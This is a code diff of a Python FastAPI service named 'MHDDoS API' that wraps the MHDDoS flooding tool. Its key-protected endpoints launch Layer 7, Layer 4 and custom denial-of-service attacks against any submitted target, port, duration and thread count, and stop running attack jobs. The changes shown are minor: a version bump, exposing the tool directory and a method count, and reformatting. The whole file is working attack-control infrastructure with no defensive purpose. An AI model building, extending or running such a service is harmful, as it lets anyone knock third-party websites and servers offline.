@@ -23,7 +23,7 @@ ALL_METHODS = L7_METHODS + L4_METHODS + CUSTOM_METHODS
 JOBS: dict[str, dict] = {}
 LOCK = threading.Lock()
 
-app = FastAPI(title="MHDDoS API", version="2.0")
+app = FastAPI(title="MHDDoS API", version="2.1")
 
 
 class AttackRequest(BaseModel):
@@ -48,8 +48,8 @@ def _count() -> int:
         return len(JOBS)
 
 
-# ── MHDDoS wrapper ──
-def build_cmd(method, target, port, duration, threads) -> list[str]:
+# ── MHDDoS wrapper (fix C3: cwd มาจาก config) ──
+def build_cmd(method, target, port, duration, threads):
     if method in L7_METHODS:
         url = target if target.startswith("http") else f"http://{target}"
         if port and ":" not in url.split("//")[-1]:
@@ -106,17 +106,18 @@ async def run_custom(job_id, method, target, port, duration, threads):
             JOBS.pop(job_id, None)
 
 
-# ── Endpoints ──
 @app.get("/")
 def root():
-    return {"name": "MHDDoS API", "version": "2.0",
+    return {"name": "MHDDoS API", "version": "2.1",
             "active": _count(), "max": MAX_CONC,
-            "curl_cffi": HAS_CURL_CFFI}
+            "curl_cffi": HAS_CURL_CFFI,
+            "mhddos_dir": MHDDOS_DIR}
 
 
 @app.get("/methods")
 def methods():
-    return {"l7": L7_METHODS, "l4": L4_METHODS, "custom": CUSTOM_METHODS}
+    return {"l7": L7_METHODS, "l4": L4_METHODS, "custom": CUSTOM_METHODS,
+            "total": len(ALL_METHODS)}
 
 
 @app.get("/status")
@@ -132,7 +133,6 @@ def status():
 async def attack(req: AttackRequest, key: str = Query("")):
     _check_key(key)
     method = req.method.upper()
-
     if method not in ALL_METHODS:
         raise HTTPException(400, f"unknown method: {method}")
     if _count() >= MAX_CONC:
@@ -154,12 +154,10 @@ async def attack(req: AttackRequest, key: str = Query("")):
 
     if method in CUSTOM_METHODS:
         asyncio.create_task(run_custom(
-            job_id, method, req.target, req.port, req.duration, threads
-        ))
+            job_id, method, req.target, req.port, req.duration, threads))
     else:
         asyncio.create_task(run_mhddos(
-            job_id, method, req.target, req.port, req.duration, threads
-        ))
+            job_id, method, req.target, req.port, req.duration, threads))
 
     return {"success": True, "status": "Attack Sent",
             "job_id": job_id, "method": method, "target": req.target,
@@ -176,12 +174,16 @@ def stop(req: StopRequest, key: str = Query("")):
         raise HTTPException(404, "job not found")
     proc = job.get("proc")
     if proc and proc.returncode is None:
-        try: proc.terminate()
-        except Exception: pass
+        try:
+            proc.terminate()
+        except Exception:
+            pass
     worker = job.get("worker")
     if worker:
-        try: worker.stop()
-        except Exception: pass
+        try:
+            worker.stop()
+        except Exception:
+            pass
     return {"success": True, "job_id": req.job_id}
 
 
@@ -194,12 +196,16 @@ def stop_all(key: str = Query("")):
     for job in jobs:
         proc = job.get("proc")
         if proc and proc.returncode is None:
-            try: proc.terminate()
-            except Exception: pass
+            try:
+                proc.terminate()
+            except Exception:
+                pass
         worker = job.get("worker")
         if worker:
-            try: worker.stop()
-            except Exception: pass
+            try:
+                worker.stop()
+            except Exception:
+                pass
     return {"success": True, "stopped": len(jobs)}
 
 
